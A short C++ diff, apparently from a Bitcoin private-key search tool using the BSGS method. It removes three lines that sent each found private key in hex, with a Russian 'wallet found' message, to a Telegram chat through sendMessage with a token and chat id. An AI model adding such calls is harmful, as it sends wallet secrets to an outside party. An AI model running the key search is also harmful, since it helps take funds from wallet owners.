@@ -5618,10 +5618,6 @@ void *thread_process_bsgs_both(void *vargp)	{
 										fprintf(filekey,"Key found privkey %s\nPublickey %s\n",hextemp,aux_c);
 										fclose(filekey);
 									}
-									
-									std::string text = "Найден кошелек (BSGS)!\nPrivHex: " + std::string(hextemp);
-									sendMessage(token, chat_id, text);
-									
 									free(hextemp);
 									free(aux_c);
 #if defined(_WIN64) && !defined(__CYGWIN__)
